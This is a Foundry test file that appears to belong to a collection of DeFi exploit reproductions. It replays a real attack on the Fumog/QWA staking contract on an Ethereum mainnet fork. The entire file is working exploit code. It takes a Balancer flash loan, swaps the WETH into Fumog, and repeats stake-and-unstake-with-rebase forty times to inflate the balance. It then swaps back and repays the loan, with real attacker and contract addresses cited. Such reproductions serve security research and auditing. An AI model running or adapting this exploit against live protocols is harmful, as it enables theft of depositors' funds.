// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo -- Total Lost : ~0.5 ETH
// TX : https://app.blocksec.com/explorer/tx/eth/0xa4659632a983b3bfd1b6248fd52d8f247a9fcdc1915f7d38f01008cff285d0bf
// Attacker : https://etherscan.io/address/0x6ce9fa08f139f5e48bc607845e57efe9aa34c9f6
// Attack Contract : https://etherscan.io/address/0x154863eb71de4a34f88ea57450840eab1c71aba6
// GUY : https://x.com/DecurityHQ/status/1699384904218202618

interface IStaking {
    function unstake(address _to, uint256 _amount, bool _rebase) external;
    function stake(address _to, uint256 _amount) external;
}
contract Exploit is Test {
    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniswapV2Router Router = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
    IERC20 Fumog = IERC20(0xc14F8A4C8272b8466659D0f058895E2F9D3ae065);
    IStaking QWAStaking = IStaking(0x69422c7F237D70FCd55C218568a67d00dc4ea068);
    IERC20 Sfumog = IERC20(0xf5bF1f78EDa7537F9cAb002a8F533e2733DDfBbC);

    function setUp() public {
        vm.createSelectFork("mainnet", 18070348);
    }

    function testExploit() public {
        address[] memory token = new address[](1);
        token[0] = address(WETH);
        uint256[] memory amount = new uint256[](1);
        amount[0] = 5  ether;
        balancer.flashLoan(address(this), token, amount, hex"28");
        emit log_named_decimal_uint("[End] Attacker WETH after exploit", WETH.balanceOf(address(this)), 18);
    }

    function receiveFlashLoan(
        address[] memory, /*tokens*/
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        WETH.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(Fumog);
        Router.swapExactTokensForTokens(amounts[0], 0, path, address(this), block.timestamp);
        Fumog.approve(address(QWAStaking), type(uint256).max);
        Sfumog.approve(address(QWAStaking), type(uint256).max);
        
        uint8 i = 0;
        while (i < uint8(userData[0])) {
            i += 1;
            uint256 amountJump = Fumog.balanceOf(address(this));
            QWAStaking.stake(address(this), amountJump);
            uint256 amountSJump = Sfumog.balanceOf(address(this));
            QWAStaking.unstake(address(this), amountSJump, true);
        }

        Fumog.approve(address(Router), type(uint256).max);
        uint256 amount = Fumog.balanceOf(address(this));
        // emit log_named_decimal_uint("Fumog token balance after exploit", amount, Fumog.decimals());
        path[0] = address(Fumog);
        path[1] = address(WETH);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
        WETH.transfer(address(balancer), amounts[0] + feeAmounts[0]);
    }

    receive() external payable {}
}
